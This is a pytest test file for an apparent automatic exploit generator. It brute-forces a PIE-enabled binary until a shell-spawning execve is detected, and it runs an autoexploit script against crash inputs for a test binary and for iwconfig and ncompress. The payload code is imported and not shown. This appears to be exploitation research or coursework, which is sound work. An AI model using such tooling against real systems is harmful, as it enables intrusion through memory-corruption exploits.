import pytest
from pwn import *
from src.exploit_utils import *
from src.payload_utils import *


def test_exploit():

    context.log_level='warn'
    # context.log_level = 'debug'
    target_bin = 'vuln'

    #this program has PIE enabled -> compilation option that changes the location of the executable in every run

    # ra_offset = locate_ra(generate_testcase(), target_bin)
    # build_payload(ra_offset, target_bin)
    exploit_cmd = build_command(target_bin, args.exploit_args)

    attach_strace()

    #performing brute force attack
    i = 0
    while True:
        # print(f"Attempt: {i}")
        i += 1

        if i >= 200:
            exploit_proc.close()
            os.remove("/app/trash")
            os.remove("/app/payload")
            os.remove("/app/strace.log")
            assert False

        exploit_proc = run_exploit(exploit_cmd)
        
        try:
            while True:

                if detect_execve():
                    assert True     #exploit succeeded, shell spawned but not interactively for testing purposes. Test passed
                    exploit_proc.close()
                    os.remove("/app/trash")
                    os.remove("/app/payload")
                    os.remove("/app/strace.log")
                    return

                output = exploit_proc.recv(timeout=0.2)   # timeout -> give enough time for target bin to read the payload and for recv to consume the content of the pty output buffer: 0.1 was not enough apparently
                if output:
                    if detect_crash(exploit_proc.pid) or i == 1:
                        truncate_log()
                        break
                else:
                    break

        except EOFError:
            log.warning("No output received, breaking out of loop.")

        exploit_proc.close()


def test_exploit2():

    # target_bins = ['vuln', 'iwconfig', 'ncompress']

    # for target in target_bins:
    #     test_target(target)


    vuln_cmd = ['python3', 'src/autoexploit.py', '-i', 'crash_inputs/vuln_input', 'vuln']
    iwconfig_cmd = ['python3', 'src/autoexploit.py', '-i', 'crash_inputs/iwconfig_input', 'iwconfig', '@@']
    ncompress_cmd = ['python3', 'src/autoexploit.py', '-i', 'crash_inputs/ncompress_input', 'ncompress', '@@']

    test_target(vuln_cmd)
    test_target(iwconfig_cmd)
    test_target(ncompress_cmd)


def test_target(target_cmd):

    test_proc = subprocess.Popen(
        target_cmd,
        stdout=subprocess.PIPE,
        text=True,
        start_new_session=True
    )
    
    time.sleep(15)
    os.killpg(test_proc.pid, signal.SIGKILL)

    # os.remove("/app/trash")
    # os.remove("/app/payload")
    # os.remove("/app/strace.log")

    with open('app.log', 'r') as applog:
        lines = applog.readlines()
        for line in lines:
            if 'Switching to interactive mode' in line:
                assert True
                break
        else:
            assert False
    os.remove('/app/app.log')
